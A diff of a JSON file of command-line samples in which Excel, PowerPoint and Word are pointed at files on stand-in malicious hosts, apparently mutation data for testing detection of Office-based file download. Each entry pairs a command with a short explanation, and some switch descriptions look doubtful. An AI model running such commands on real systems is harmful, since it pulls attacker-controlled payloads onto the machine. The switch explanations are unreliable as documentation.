@@ -1,14 +1,14 @@
 [
   {
-    "output": "EXCEL.EXE \"http://malicious-domain.com/payload.csv\"",
-    "explanation": "This command simulates a potential arbitrary file download using Excel by specifying a URL in the command line. The quotes are inserted for safe parsing, and the URL is modified for testing purposes."
+    "output": "excel.exe /k \"http://example.com/malicious.xlsx\"",
+    "explanation": "This command simulates a potential arbitrary file download using Excel. The /k switch opens the specified file, and the URL is enclosed in quotes to handle safe mutation techniques like insertion."
   },
   {
-    "output": "POWERPNT.EXE \"https://malicious-domain.com/share/payload.pptx\"",
-    "explanation": "This command simulates a potential arbitrary file download using PowerPoint by specifying a URL in the command line. The quotes are inserted for safe parsing, and the URL is modified for testing purposes."
+    "output": "powerpnt.exe -s http://example.com/malicious.pptx",
+    "explanation": "This command simulates a potential arbitrary file download using PowerPoint. The -s switch is used to open a file, and the URL is provided directly without additional quoting to test for equivalent syntax (substitution)."
   },
   {
-    "output": "WINWORD.EXE \\\\evil-server.local\\share\\payload.docx",
-    "explanation": "This command simulates a potential arbitrary file download using Word by specifying a UNC path in the command line. The path is modified for testing purposes."
+    "output": "winword.exe \"https://example.com/malicious.docx\"",
+    "explanation": "This command simulates a potential arbitrary file download using Word. The URL is enclosed in quotes to test safe mutation techniques like insertion and ensure correct parsing."
   }
 ]
